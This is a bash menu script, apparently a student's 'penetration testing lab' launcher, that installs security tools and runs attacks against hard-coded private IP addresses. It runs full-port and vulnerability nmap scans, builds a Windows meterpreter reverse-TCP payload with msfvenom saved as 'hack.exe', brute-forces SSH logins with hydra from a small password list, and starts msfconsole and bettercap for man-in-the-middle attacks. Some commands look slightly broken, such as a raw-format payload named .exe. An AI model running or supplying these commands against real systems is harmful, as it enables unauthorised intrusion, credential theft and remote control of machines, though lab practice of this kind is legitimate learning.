#!BISMILLAH
#Written By:Md Sajibur Rahman
#Roll:18CSE048
#Reg:110-048-18
#University of Barishal(BU)

jp2a me.jpg --colors
mycolor="\e[34m"
printf "$mycolor"

figlet -f standard "WellCome To My Penetration Testing Lab" 
echo -e "\e[31mThis \e[32mis \e[33mmy \e[34mpenetration \e[35mTesting   \e[36mLab\e[0m"

echo "[+] Enter The option to use the tools"
echo "[+] -1 Checking Ip Address"
echo "[+] 0. Update your system and install the Dependencies"
echo "[+] 1. Install All the tools Dependencies"
echo "[+] 2. Udate your Networking Cli tools"
echo "[+] 3. Nmap Installation"
echo "[+] 4. Nmap first Scan"
echo "[+] 5. Nmap second Scan"
echo "[+] 6. Nmap Thrid Scan"
echo "[+] 7. Msf-venom  windows payload "
echo "[+] 8. Msfconsole"
echo "[+] 9. Hydra Brute-force login"
echo "[+] 10.EXIT"
echo "[+] 11.Enable All_services."
echo "[+] 12 Man in the middle attack"
echo "Enter a number to choose the options"


read n
if((n==-1));
then
ifconfig | sed -En 's/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p' | sed -n '2p'
bash MasterV2.sh
elif((n==0));
then
     echo " Which Distro are you using?"
     echo "[+] 1. Debian"
     echo "[+] 2.Arch"
     echo "Choose an Option"
     read x
     if((x==1));
     then
	     sudo apt-get update -y && sudo apt-get upgrade -y
     elif((x==2));
     then
             sudo pacman -Syu	     
     fi
bash MasterV2.sh
elif((n==1));
then
      echo "Make sure you have installed ssh,apache/apache2,mysql,hydra, on your Machine" 
      sudo pacman -S apache -y
      sudo pacman -S mysql -y
      sudo pacman -S openssh -y 
      sudo pacman -S ufw -y 
      sudo pacman -S hydra -y
      sudo pacman -S metasploit -y

bash MasterV2.sh
elif((n==2));
then
      echo "Install net-tools"
      echo "[+] 1. Debian Distro"
      echo "[+] 2. Arch Distro"
      echo " Choose an Option"
      read y
      if((y==1));
      then
           sudo apt-get install net-tools
      elif((y==2));
      then      
           sudo pacman -S net-tools
      fi
bash MasterV2.sh
elif((n==3));
then	
      echo "Install Nmap"
      echo "[+] 1. Debian Distro"
      echo "[+] 2. Arch Distro"
      read z
      if((z==1));
      then
          sudo apt-get install nmap
      elif((z==2));
      then	      
           sudo pacman -S nmap
      fi 
bash MasterV2.sh
elif((n==4));
then
      nmap 172.26.154.69 -p- --min-rate 20000 
bash MasterV2.sh

elif((n==5));
then
      nmap -sCV 172.26.154.69
bash MasterV2.sh      
elif((n==6));
then
     nmap -sV -sC --script=vuln -v 172.26.154.69
bash MasterV2.sh

elif((n==7));
then
     
     echo "Open another terminal using ctrl+alt+t and the type the below commands"
     echo " Type sudo pacman -Syu for Arch-Linux and sudo apt-get update -y && sudo apt-get upgrade -y for Debian" 
     echo "Make sure you have already update or upgrade your system"
     echo "Type 'sudo pacman -S metasploit' for Arch Linux"
     echo "Type 'sudo apt-get install matasploit-framework"
     echo "your Distro"
     echo "[+] 1. Arch"
     echo "[+] 2. Debian"
     read m
     if((m==1));
     then
	 sudo pacman -S metasploit
     elif((m==2));
     then
         sudo apt-get install metasploit-framework 	     
     fi	     
     msfvenom -p windows/meterpreter/reverse_tcp lhost=172.26.154.69 lport=4444 -f raw > hack.exe	
bash MasterV2.sh
elif((n==8));
then	
     msfconsole	
bash MasterV2.sh
elif((n==9));
then	
     echo "You have to have a  password.txt file where the script is running" 
     echo "Make sure you have installed hydra"    
     echo "If not type 'sudo apt-get install hydra' for Debian 'sudo pacman -S hydra' for Arch"
     echo "your distro"
     echo "[+] 1.Arch"
     echo "[+] 2.Debian"   
     read k
     if((k==1));
     then
        sudo pacman -S hydra
     elif((k==2));
     then
        sudo apt-get install hydra	     
     fi

     rm -rf password.txt
     echo admin >>password.txt &&echo sajib >>password.txt && echo toor >>password.txt
     
     hydra -l sajib -P password.txt -T 20 172.26.154.60 ssh

bash MasterV2.sh
elif((n==10));
then
     exit	


elif((n==11));
then
    
    sudo pacman -S openssh
    sudo systemctl start httpd
    sudo systemctl enable httpd
    sudo systemctl start sshd
    sudo systemctl enable sshd
    sudo ufw allow 22/tcp


bash MasterV2.sh      
elif((n==12));
then
     sudo apt-get install bettercap -y
     sudo bettercap     
bash MasterV2.sh     
fi 



